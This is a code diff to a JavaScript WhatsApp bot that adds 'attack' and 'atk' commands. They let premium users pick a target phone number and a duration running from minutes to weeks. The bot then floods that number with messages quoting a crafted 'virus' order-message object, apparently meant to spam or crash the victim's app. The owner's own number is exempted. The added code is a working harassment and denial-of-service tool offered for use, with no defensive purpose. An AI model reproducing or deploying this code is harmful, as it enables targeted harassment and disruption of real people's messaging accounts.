@@ -109,7 +109,11 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
                 const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
                 mention != undefined ? mention.push(mentionByReply) : []
                 const mentionUser = mention != undefined ? mention.filter(n => n) : []
-                
+                const virus =  {
+             key: { fromMe: false,remoteJid: "fleyvin soft@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: global.thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
+     const serang = (nomore) => {
+           conn.sendMessage(nomore, { text: nomore, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(settimg.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
+           }
 		const sendFileFromUrl = async (from, url, caption, options = {}) => {
 		    let mime = '';
 		    let res = await axios.head(url)
@@ -2597,6 +2601,87 @@ module.exports = async(conn, msg, m, setting, store, welcome) => {
 			      reply(`Sukses`)
 				}).catch(() => reply("Maaf terjadi kesalahan"))
 				break
+            case prefix+'attack':
+	    if (!isOwner && !isPremium) return reply(`Fitur hanya dapat di gunakan oleh user premium`)
+	    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+        if (args.length < 2) return reply(`Mau Attack Siapa?`)
+let nomore = q.replace(/[^0-9]/g, "").replace(/[^0-9]/g, "")
+let noget = nomore.replace(/[@s.whatsapnet]/g, "").replace(/[@S.WHATSAPNET]/g, "")
+if (isNaN(noget)) return reply(`Must be a number Bitch!! `)
+var satgnz = "6281316701742"
+let isnoown = new RegExp(satgnz, 'i')
+let isOwn = isnoown.test(m.text)
+ if (isOwn) return m.reply(`You Can't ${command} My Owner Bitch!`)
+ {
+ 	var listMsg = {
+                text: `${ucapanWaktu} @${sender.split("@")[0]}, \n\nSilahkan Pilih Durasi Penyerangan`,
+                buttonText: 'Click Here!',
+                footer: `© Kurniawan Satria`,
+                mentions: [sender],
+                sections: [
+                {
+title: "MINUTE SELECTION",
+                rows: [
+{title: "1 Minute", rowId: `${prefix}atk ${noget}|1`, description: `Attack ${noget} During 1 Minute `},
+{title: "2 Minute", rowId: `${prefix}atk ${noget}|2`, description: `Attack ${noget} During 2 Minute`},
+{title: "3 Minute", rowId: `${prefix}atk ${noget}|3`, description: `Attack ${noget} During 3 Minute`},
+{title: "4 Minute", rowId: `${prefix}atk ${noget}|4`, description: `Attack ${noget} During 4 Minute`},
+{title: "5 Minute", rowId: `${prefix}atk ${noget}|5`, description: `Attack ${noget} During 5 Minute`},
+                ]
+                },
+                {
+title: "CLOCK SELECTION",
+                rows: [
+{title: "1 Hours", rowId: `${prefix}atk ${noget}|60`, description: `Attack ${noget} During 1 Hours `},
+{title: "2 Hours", rowId: `${prefix}atk ${noget}|120`, description: `Attack ${noget} During 2 Hours `},
+{title: "3 Hours", rowId: `${prefix}atk ${noget}|180`, description: `Attack ${noget} During 3 Hours `},
+{title: "4 Hours", rowId: `${prefix}atk ${noget}|240`, description: `Attack ${noget} During 4 Hours `},
+{title: "5 Hours", rowId: `${prefix}atk ${noget}|300`, description: `Attack ${noget} During 5 Hours `}
+                ]
+                },
+                {
+title: "DAILY SELECTION",
+rows: [
+{title: "1 Day", rowId: `${prefix}atk ${noget}|1440`, description: `Attack ${noget} During 1 Day `},
+{title: "2 Day", rowId: `${prefix}atk ${noget}|2880`, description: `Attack ${noget} During 2 Day `},
+{title: "3 Day", rowId: `${prefix}atk ${noget}|4320`, description: `Attack ${noget} During 3 Day `},
+{title: "4 Day", rowId: `${prefix}atk ${noget}|5760`, description: `Attack ${noget} During 4 Day `},
+{title: "5 Day", rowId: `${prefix}atk ${noget}|7200`, description: `Attack ${noget} During 5 Day `}
+]
+},
+{
+title: "WEEKLY SELECTION",
+rows: [
+{title: "1 Week", rowId: `${prefix}atk ${noget}|10080`, description: `Attack ${noget} During 1 Week `},
+{title: "2 Week", rowId: `${prefix}atk ${noget}|20160`, description: `Attack ${noget} During 2 Week `},
+{title: "3 Week", rowId: `${prefix}atk ${noget}|30240`, description: `Attack ${noget} During 3 Week `},
+{title: "4 Week", rowId: `${prefix}atk ${noget}|40320`, description: `Attack ${noget} During 4 Week `},
+{title: "5 Week", rowId: `${prefix}atk ${noget}|50400`, description: `Attack ${noget} During 5 Week `}
+]
+},
+]
+            }
+conn.sendMessage(from, listMsg)
+}
+break
+case prefix+'atk':
+if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
+if (args.length < 2) return reply(`Examples of use : ${command} >Target<|*>Amount<*`) 
+let spar = q.split("|")[0]
+let terern = q.split("|")[1]
+var satgnz = "6281316701742"
+let isLinkThisGc = new RegExp(satgnz, 'i')
+let isgclink = isLinkThisGc.test(m.text)
+ if (isgclink) return reply(`You Can't Attack My Owner`)
+if (!terern) return reply(`Examples of use : ${command} *>Target<*|*>Amount<*`)
+for (let i = 0; i < terern; i++){
+conn.sendMessage(`${spar}@s.whatsapp.net`, { text: "Hi", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(setting.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
+}
+let ter = q.split("|")[1]
+reply(`Success Attack Target During Attack ${ter} Minutes`)
+break
+            conn.sendMessage(from, { text: "haii?", contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(setting.pathimg),"sourceUrl": "hehe"}}}, { quoted: virus})
+            break
 			case prefix+'group': case prefix+'grup':
 		        if (!isGroup) return reply(mess.OnlyGrup)
 				if (!isGroupAdmins) return reply(mess.GrupAdmin)
